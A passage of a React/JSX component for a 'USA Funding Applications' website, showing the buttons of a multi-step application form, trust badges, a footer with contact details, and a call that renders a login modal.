                    className={`px-6 py-3 rounded-lg font-medium transition-all ${
                      currentStep === 1
                        ? "bg-gray-100 text-gray-400 cursor-not-allowed"
                        : "bg-gray-200 text-gray-700 hover:bg-gray-300"
                    }`}
                  >
                    ← Back
                  </button>

                  {currentStep < totalSteps ? (
                    <button
                      type="button"
                      onClick={handleNext}
                      className="px-8 py-3 bg-gradient-to-r from-blue-600 to-indigo-600 text-white rounded-lg font-medium hover:from-blue-700 hover:to-indigo-700 transition-all shadow-lg shadow-blue-200"
                    >
                      Next →
                    </button>
                  ) : (
                    <button
                      type="submit"
                      disabled={!formData.termsAccepted || loading}
                      className={`px-8 py-3 rounded-lg font-medium transition-all shadow-lg ${
                        formData.termsAccepted && !loading
                          ? "bg-gradient-to-r from-green-600 to-emerald-600 text-white hover:from-green-700 hover:to-emerald-700 shadow-green-200"
                          : "bg-gray-300 text-gray-500 cursor-not-allowed"
                      }`}
                    >
                      {loading ? 'Submitting...' : 'Submit & Chat on WhatsApp'}
                    </button>
                  )}
                </div>
              </>
            )}
          </form>
        </div>

        {/* Trust Badges */}
        <div className="mt-8 grid grid-cols-2 md:grid-cols-4 gap-4">
          <div className="bg-white rounded-lg p-4 text-center shadow-sm border border-gray-200">
            <div className="w-12 h-12 mx-auto mb-2 bg-blue-100 rounded-full flex items-center justify-center">
              <svg className="w-6 h-6 text-blue-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
              </svg>
            </div>
            <p className="text-sm font-medium text-gray-700">Secure & Private</p>
          </div>
          <div className="bg-white rounded-lg p-4 text-center shadow-sm border border-gray-200">
            <div className="w-12 h-12 mx-auto mb-2 bg-green-100 rounded-full flex items-center justify-center">
              <svg className="w-6 h-6 text-green-600" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.582 2.128 2.182-.573c.978.58 1.911.928 3.145.929 3.178 0 5.767-2.587 5.768-5.766.001-3.187-2.575-5.77-5.764-5.771z"/>
              </svg>
            </div>
            <p className="text-sm font-medium text-gray-700">WhatsApp Support</p>
          </div>
          <div className="bg-white rounded-lg p-4 text-center shadow-sm border border-gray-200">
            <div className="w-12 h-12 mx-auto mb-2 bg-purple-100 rounded-full flex items-center justify-center">
              <svg className="w-6 h-6 text-purple-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
              </svg>
            </div>
            <p className="text-sm font-medium text-gray-700">Fast Approval</p>
          </div>
          <div className="bg-white rounded-lg p-4 text-center shadow-sm border border-gray-200">
            <div className="w-12 h-12 mx-auto mb-2 bg-orange-100 rounded-full flex items-center justify-center">
              <svg className="w-6 h-6 text-orange-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M18.364 5.636l-3.536 3.536m0 5.656l3.536 3.536M9.172 9.172L5.636 5.636m3.536 9.192l-3.536 3.536M21 12a9 9 0 11-18 0 9 9 0 0118 0zm-5 0a4 4 0 11-8 0 4 4 0 018 0z" />
              </svg>
            </div>
            <p className="text-sm font-medium text-gray-700">24/7 Support</p>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-gray-900 text-white mt-16">
        <div className="max-w-4xl mx-auto px-4 py-8">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            <div>
              <div className="flex items-center space-x-2 mb-4">
                <div className="w-8 h-8 bg-gradient-to-r from-blue-500 to-indigo-500 rounded-lg flex items-center justify-center">
                  <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                </div>
                <span className="font-bold">USA Funding Applications</span>
              </div>
              <p className="text-gray-400 text-sm">
                Connecting businesses and individuals with the right funding solutions since 2010.
              </p>
            </div>
            <div>
              <h4 className="font-semibold mb-4">Quick Links</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li><a href="#" className="hover:text-white transition-colors">Home</a></li>
                <li><a href="#" className="hover:text-white transition-colors">About Us</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Funding Options</a></li>
                <li><a href="#" className="hover:text-white transition-colors">Contact</a></li>
              </ul>
            </div>
            <div>
              <h4 className="font-semibold mb-4">Contact Info</h4>
              <ul className="space-y-2 text-sm text-gray-400">
                <li className="flex items-center space-x-2">
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" />
                  </svg>
                  <span>1-800-FUNDING</span>
                </li>
                <li className="flex items-center space-x-2">
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                  </svg>
                  <span>info@usafundingapplications.org</span>
                </li>
              </ul>
            </div>
          </div>
          <div className="border-t border-gray-800 mt-8 pt-6 text-center text-sm text-gray-400">
            <p>&copy; 2025 USA Funding Applications. All rights reserved.</p>
            <div className="mt-2 space-x-4">
              <a href="#" className="hover:text-white transition-colors">Privacy Policy</a>
              <a href="#" className="hover:text-white transition-colors">Terms of Service</a>
              <a href="#" className="hover:text-white transition-colors">Disclaimer</a>
            </div>
          </div>
        </div>
      </footer>

      {/* Login Modal */}
      {showLogin && renderLoginModal()}
    </div>
  );
}